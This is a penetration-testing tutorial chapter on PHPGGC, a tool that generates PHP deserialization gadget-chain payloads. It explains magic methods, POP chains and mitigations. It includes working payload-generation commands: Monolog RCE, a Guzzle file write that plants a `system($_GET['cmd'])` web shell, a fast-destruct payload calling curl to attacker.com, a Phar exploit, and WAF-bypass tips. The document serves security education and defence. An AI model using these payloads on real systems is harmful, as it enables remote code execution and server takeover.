# 59.43 PHPGGC PHP Gadget Chain Generator

## 1. Introduction and Core Capabilities

`PHPGGC` (PHP Generic Gadget Chains) is an open-source exploitation framework dedicated to generating payloads for PHP object injection and insecure deserialization vulnerabilities. Similar in concept to Java's `ysoserial`, `PHPGGC` provides a repository of pre-discovered gadget chains for popular PHP frameworks and libraries.

When a PHP application utilizes the native `unserialize()` function on user-controlled data, it blindly instantiates PHP objects and populates their properties. If the application's codebase (or its dependencies) contains classes with specific "Magic Methods" (`__wakeup()`, `__destruct()`, `__toString()`), these methods are automatically executed during or immediately after deserialization, leading to critical vulnerabilities.

### 1.1 Why PHPGGC?

Finding Property Oriented Programming (POP) chains in PHP requires deep, manual source code review of the target's entire vendor directory. `PHPGGC` eliminates this overhead by cataloging proven chains for widely used libraries, allowing security testers to quickly generate reliable payloads for Remote Code Execution (RCE), File Write, File Read, or Server-Side Request Forgery (SSRF).

### 1.2 Primary Features

*   **Extensive Chain Library**: Supports frameworks like Laravel, Symfony, Yii, Slim, and libraries like Monolog, Guzzle, and SwiftMailer.
*   **Multiple Output Formats**: Can encode payloads with Fast-Destruct bypasses, ASCII-strings, or specialized wrappers (Phar).
*   **Modular Extensibility**: Researchers can easily add new POP chains by defining simple PHP classes within the tool's structure.

## 3. Installation and Setup

`PHPGGC` is a standalone PHP command-line application. It does not require complex compilation or extensive dependencies outside of a standard PHP CLI environment.

```bash
# Clone the repository
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# Make the script executable
chmod +x phpggc

# List all available gadget chains
./phpggc -l
```

## 4. Deep Dive: Magic Methods and POP Chains

Understanding `PHPGGC` requires a firm grasp of PHP's object lifecycle and Property Oriented Programming.

### 4.1 The Role of Magic Methods

PHP objects contain specialized methods prefixed with double underscores, known as magic methods. These are invoked automatically during specific events:
*   `__wakeup()`: Called immediately when `unserialize()` successfully reconstructs an object.
*   `__destruct()`: Called when there are no other references to an object, or when the script terminates.
*   `__toString()`: Called when an object is treated as a string (e.g., `echo $obj;`).
*   `__call()`: Called when an inaccessible or undefined method is invoked.

### 4.2 Property Oriented Programming (POP)

Unlike standard buffer overflows that hijack execution flow via instruction pointers, POP chains manipulate the *properties* (state) of deserialized objects. An attacker crafts a serialized string where object properties are carefully pre-configured. When a magic method fires, it uses these attacker-controlled properties, calling other methods, eventually reaching a dangerous sink like `eval()`, `system()`, or `file_put_contents()`.

## 5. Comprehensive Command Reference

The standard syntax for generating a payload with `PHPGGC` is:

`./phpggc <GadgetChain> <Method> <Parameters>`

### 5.1 Common Gadget Chains and Types

*   **RCE (Remote Code Execution)**: Executes arbitrary system commands or PHP code. (e.g., `Laravel/RCE1`, `Monolog/RCE1`).
*   **FW (File Write)**: Writes arbitrary content to a specified path. (e.g., `Guzzle/FW1`).
*   **FD (File Delete)**: Deletes files on the filesystem.
*   **SQLI (SQL Injection)**: Triggers an SQL injection via ORM state manipulation.

### 5.2 Payload Generation Examples

**Basic RCE via Monolog:**
```bash
./phpggc Monolog/RCE1 system id
```

**Writing a PHP Web Shell via Guzzle:**
```bash
./phpggc Guzzle/FW1 /var/www/html/shell.php "<?php system(\$_GET['cmd']); ?>"
```

**Base64 and URL Encoding for direct HTTP Injection:**
```bash
./phpggc -b -u Monolog/RCE1 system id
```

## 6. Advanced Exploitation Vectors

### 6.1 The Fast-Destruct Bypass (`-f` flag)

Often, application logic might crash or throw an exception immediately *after* `unserialize()` is called, but *before* the script reaches normal termination. If your POP chain relies on `__destruct()`, it might never execute.

The Fast-Destruct technique modifies the serialized structure (typically by corrupting an array index or object reference length) to intentionally cause a localized parsing error. This forces PHP's Garbage Collector to immediately destroy the partially constructed objects, triggering `__destruct()` synchronously, bypassing the application-level crash.

```bash
./phpggc -f Monolog/RCE1 system "curl http://attacker.com/callback"
```

### 6.2 Phar Deserialization Wrapper

Even if `unserialize()` is not explicitly used, PHP applications are vulnerable to deserialization if they perform file operations (like `file_exists()`, `file_get_contents()`, `md5_file()`) on user-controlled paths.

By using the `phar://` wrapper, an attacker can point a file function to a malicious Phar archive. When PHP parses the Phar file, it automatically deserializes its internal metadata, triggering POP chains.

```bash
# Generate a Phar archive containing the payload
./phpggc -p phar -o exploit.phar Monolog/RCE1 system id
```
*Exploitation:* If a site has `file_exists($_GET['file'])`, sending `?file=phar://path/to/uploaded/exploit.phar` will trigger RCE.

## 7. Troubleshooting and Common Errors

*   **Target Application Crashes (No Execution)**: Ensure the exact version of the framework on the target matches the chain. Use the `-i` flag (`./phpggc -i Laravel/RCE1`) to check supported versions.
*   **Payload Too Large**: Some applications restrict cookie size or input length. In these cases, avoid RCE chains and opt for File Write chains, or attempt to chain to an `eval()` sink with a shorter payload.
*   **WAF Blocking `O:X:`**: WAFs often block standard PHP serialized object signatures (`O:length:"Class"`). You can bypass some basic filters by using `C:` (Custom Object Serialization) if the class implements `Serializable`, though `PHPGGC` manages the structural output automatically.

## 8. Defensive Mitigation and Remediation

1.  **Never Unserialize Untrusted Data**: The golden rule. Replace `unserialize()` with `json_decode()`. JSON cannot instantiate PHP objects or trigger magic methods.
2.  **HMAC Signatures**: If serialized data must be passed (e.g., in a cookie), digitally sign it with an HMAC. Verify the signature *before* passing the data to `unserialize()`.
3.  **Allowed Classes Restrictions**: In PHP 7.0+, `unserialize()` accepts a second parameter: `allowed_classes`. You can explicitly define an array of class names permitted for deserialization, or set it to `false` to prevent any object instantiation.
    ```php
    // Safe Deserialization
    $data = unserialize($payload, ["allowed_classes" => false]);
    ```
4.  **Disable Phar Processing**: If Phar archives are not required by the application, disable the `phar://` stream wrapper entirely in the `php.ini` configuration to neutralize Phar-based deserialization attacks.
